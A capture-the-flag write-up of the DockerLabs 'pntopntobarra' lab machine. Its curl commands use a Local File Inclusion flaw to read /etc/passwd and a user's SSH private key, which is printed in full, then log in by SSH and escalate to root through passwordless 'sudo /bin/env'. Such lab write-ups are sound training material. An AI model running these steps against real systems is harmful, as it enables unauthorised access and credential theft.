# pntopntobarra

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| pntopntobarra | maciiii___ | easy/facil | dockerlabs |

**Summary:** The pntopntobarra machine was a clean Local File Inclusion to SSH private key disclosure challenge followed by a trivial `sudo env` root escalation. The web application on port 80 served a page titled "Advertencia: LeFvIrus" with an `ejemplos.php` script that accepted an `images` parameter vulnerable to LFI. Reading `/etc/passwd` via the LFI disclosed the username `nico`. A second LFI request targeting `/home/nico/.ssh/id_rsa` returned the full RSA private key embedded inside the HTML response. The key was extracted from the response using `sed`, saved to a file, permissions set to 600, and used directly with `ssh -i` to authenticate as `nico` without a password. A `sudo -l` check immediately revealed passwordless access to `/bin/env` as any user. Running `sudo /bin/env /bin/bash` spawned a root shell instantly.

---

## Reconnaissance

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ sudo bash auto_deploy.sh pntopntobarra.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-03 18:30 +0700
Nmap scan report for bypass403.pw (172.17.0.2)
Host is up (0.000010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2e:4a:72:a0:b2:40:3a:36:99:c9:2d:a7:62:61:16:e7 (ECDSA)
|_  256 7c:7d:78:7a:20:2b:d0:75:92:26:1b:41:3c:ca:79:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Advertencia: LeFvIrus
MAC Address: A2:A1:DE:7C:37:29 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.25 seconds
```

The scan revealed SSH on port 22 and Apache on port 80 titled "Advertencia: LeFvIrus".

---

## Initial Access

### LFI via ejemplos.php images Parameter

**3. Inspecting the Web Application**

The web application served a warning-themed page.

![](image.png)

Inspecting the application further revealed an `ejemplos.php` script with an `images` parameter.

![](image-1.png)

**4. Reading /etc/passwd via LFI**

The `images` parameter was directly vulnerable to Local File Inclusion. Passing `/etc/passwd` disclosed all system accounts.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ curl "http://$ip/ejemplos.php?images=/etc/passwd"
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ejemplos de computadoras infectadas</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Computadoras infectadas</h1>

        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
nico:x:1000:1000:,,,:/home/nico:/bin/bash
    </div>
</body>
</html>
```

The username `nico` was disclosed. With SSH open on port 22, the next step was to attempt to read `nico`'s private SSH key via the same LFI vector.

**5. Reading nico's SSH Private Key via LFI**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ curl -s "http://$ip/ejemplos.php?images=/home/nico/.ssh/id_rsa"            
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ejemplos de computadoras infectadas</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Computadoras infectadas</h1>

        -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA07BRWc6X8Yz+VwO1l5UAqcFE5K+1yQ9QxFBrt8DzyC9x7o0tluCk
4f4gObHgatf/tXX/z8oGKYnAY48/vctJz//3M9phYgcFhoDOs+F3NgyYZ7oZN/TeEgTlql
Z4QGyjn5akiLmDwSTqEqd5Tla+KnNVCEHO2MpoDTWJB4uI6TdHt3iDX19jszJ+r9BNZODk
O7RUkL72sq2pAHLfhlPlaDdH50cd/1bNOkm45U4JmXxTrWNh4AmaZdHGIPiQpvRUJDXack
9tfWaxXBRG95YHh1DMg8LZujKkk35XbesoMBK+eh2mBdISDxR7+XPTyiyGAJ0Qts2TjIfm
2Agqzwbjl1uPffyMrjS2t5gzKcWuPDXWKXmy0rF6ZEWw2hKdC3oY/rxM+zg5B+cnmCTja5
5AgpYgnxN7PD4BLqGFP5Nu1bZ3txduoDlEROHkmsIAJMwy6JNRg7qNL11m2S8YuxR5Iyi5
gpgnD3PQxEepQ0L/7xrUELUvf4jnaLnNBiFaDob7AAAFiNB8ulDQfLpQAAAAB3NzaC1yc2
EAAAGBANOwUVnOl/GM/lcDtZeVAKnBROSvtckPUMRQa7fA88gvce6NLZbgpOH+IDmx4GrX
/7V1/8/KBimJwGOPP73LSc//9zPaYWIHBYaAzrPhdzYMmGe6GTf03hIE5apWeEBso5+WpI
i5g8Ek6hKneU5WvipzVQhBztjKaA01iQeLiOk3R7d4g19fY7Myfq/QTWTg5Du0VJC+9rKt
qQBy34ZT5Wg3R+dHHf9WzTpJuOVOCZl8U61jYeAJmmXRxiD4kKb0VCQ12nJPbX1msVwURv
eWB4dQzIPC2boypJN+V23rKDASvnodpgXSEg8Ue/lz08oshgCdELbNk4yH5tgIKs8G45db
j338jK40treYMynFrjw11il5stKxemRFsNoSnQt6GP68TPs4OQfnJ5gk42ueQIKWIJ8Tez
w+AS6hhT+TbtW2d7cXbqA5RETh5JrCACTMMuiTUYO6jS9dZtkvGLsUeSMouYKYJw9z0MRH
qUNC/+8a1BC1L3+I52i5zQYhWg6G+wAAAAMBAAEAAAGAESvILYS4hnttVhmS7UzE1QA8Wm
B2WmzHnGT5l9oq7B4NG9CP1iE6vqoiawumrIQA1fNQYMZ+YXgvBuRjwz1uK1UT9DzOkWkI
ZbSlD6pGRTgYVLGfwg42xTdoebyx3GfzjcpmZkDGEzCvW/wBtv0KR987EoRkBunELu4cw2
PqIyC8zIEWBvJx3+NEq3Y2EOy9Fqq2AVe8Ixo7DzJCN18uyJlTV8tI/6FG3GeGe/MsjCqt
ju70zXt57rBpZdtDwIco9kjkhfoF9HQrfRTDlZFwvsPDs1gVpLERXybguKAp2oxZ/CdzoZ
WbYDasDAoXNgbOADgkgc6TWslXinpt4SdGiObbZWtL9eb1KuggZL1NMq4d/MphApMA+gxt
X1aMEV+fiQ0UPNd9WIJWhBiyu4Q+GpeavHeDULGsObuDyfEQKtzbxoX3cTscQ48qAI+y+F
jVELxly8iGsmLTZGGwlhlhhbYg5Tuf2hsPEOXZAzjxgYrTwBm/fB6esLPGtR1pV5nhAAAA
wHgMkNkzMNwCHO0Lme3p3As9+9yXfOiNmtbgcVIECMLQ97r8TFvqQMO28gxbBNzvkCDVEq
5yi0ErDFxPZJdqFLyRGfDCLyeggUKXr6rVXByo3CQwUgL7U06nusTNzczibWTDxQNbVhJS
5o68k1ltgYarJFRPLxQThj9vyyTZk5jLWuHpmG7hEM0krA+9PK9OVI9McvH4q+rutLFDG2
GdQcJd1fz3ATJWyHDOA6/0tHZKIKst4925nJKC/c5A6SzA1QAAAMEA85OwFy2js+ZdDiNg
AEGnJfFRu7bC/cE0kNi4HnVBA3mjz1OP4NE/OudX6v0NObvw2ZgoUTAxAduQ+sCHwyI73n
XM31TeyMRbAfpCZ92xRsllCFS2zLmpy8jzPu1BzPGDI0UoWQs7VPeXm13CexexGcmOXxuv
9lqIIv+9GFaB5TxS6K7yaySgrvI3BUmvqGCx4fnWNf/6yrZ1raObcb3yGvqnrCexDySYq3
hXvIai+6lKnPeetrE5LshmcXdJwUIFAAAAwQDefEaIqWZ3JcxAD04Z8/O6uhZ3WOYoLuHX
fJlc5trofrBQL5xa4P53ngHUxA4F2DbQCqbPaSCZFirq3IUEUzzOZ5Npvuur5VO41EtxTp
CC2BZ0iK2UIBhk/Q62gLCU2EnuHtu6dbLEeuDF6tIlKXGbw0Lib54wRFHHQyETjJI3UGjV
QkAljDAS+mPSQgQ0Mdc/KUBZ8e3AE39dxKcYs5WFyfiiZ72TJJekOiJICcOAPLH0iP+lru
ayyxi3hh3t9P8AAAARbmljb0AzYTQ4YjEyYjU3YTIBAg==
-----END OPENSSH PRIVATE KEY-----
    </div>
</body>
</html>
```

The full RSA private key for `nico` was returned embedded in the HTML response.

**6. Extracting the Key and Connecting via SSH**

The key was extracted from the response using `sed` to isolate the PEM block, stripped of leading whitespace, saved to a file, and its permissions set to 600.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ curl -s "http://$ip/ejemplos.php?images=/home/nico/.ssh/id_rsa" | sed -n '/-----BEGIN/,/-----END/p' | sed 's/^[ \t]*//' > id_rsa
                                                                                                                              
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ chmod 600 id_rsa
                                                                                                                              
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pntopntobarra]
└─$ ssh -i id_rsa nico@$ip
Linux 5ec5818e5f5d 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 21 21:11:09 2024 from 172.17.0.1
nico@5ec5818e5f5d:~$ id;whoami
uid=1000(nico) gid=1000(nico) groups=1000(nico),100(users)
nico
```

SSH access was established as `nico` using the extracted private key with no passphrase required.

---

## Privilege Escalation

### sudo env Direct Root Shell

**7. Checking sudo Permissions and Escalating**

```bash
nico@5ec5818e5f5d:~$ sudo -l
Matching Defaults entries for nico on 5ec5818e5f5d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nico may run the following commands on 5ec5818e5f5d:
    (ALL) NOPASSWD: /bin/env
nico@5ec5818e5f5d:~$ sudo /bin/env /bin/bash
root@5ec5818e5f5d:/home/nico# cd
root@5ec5818e5f5d:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
5ec5818e5f5d
```

`nico` could run `/bin/env` as any user without a password. Passing `/bin/bash` as the command argument to `sudo env` launched bash with root privileges directly.

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap identified SSH on port 22 and Apache on port 80 titled "Advertencia: LeFvIrus".
2. **Vulnerability Discovery**: The `ejemplos.php` script accepted an `images` parameter that was passed directly to a file include function with no path sanitisation, creating an LFI. Passing `/etc/passwd` disclosed the username `nico`.
3. **Exploitation**: A second LFI request targeting `/home/nico/.ssh/id_rsa` returned the full OpenSSH RSA private key embedded in the HTML response. The key was extracted with `sed`, saved with permissions 600, and used with `ssh -i` to authenticate as `nico` without a passphrase.
4. **Privilege Escalation**: A `sudo -l` check revealed passwordless access to `/bin/env` as any user. Running `sudo /bin/env /bin/bash` launched bash as root immediately, producing a full root shell.
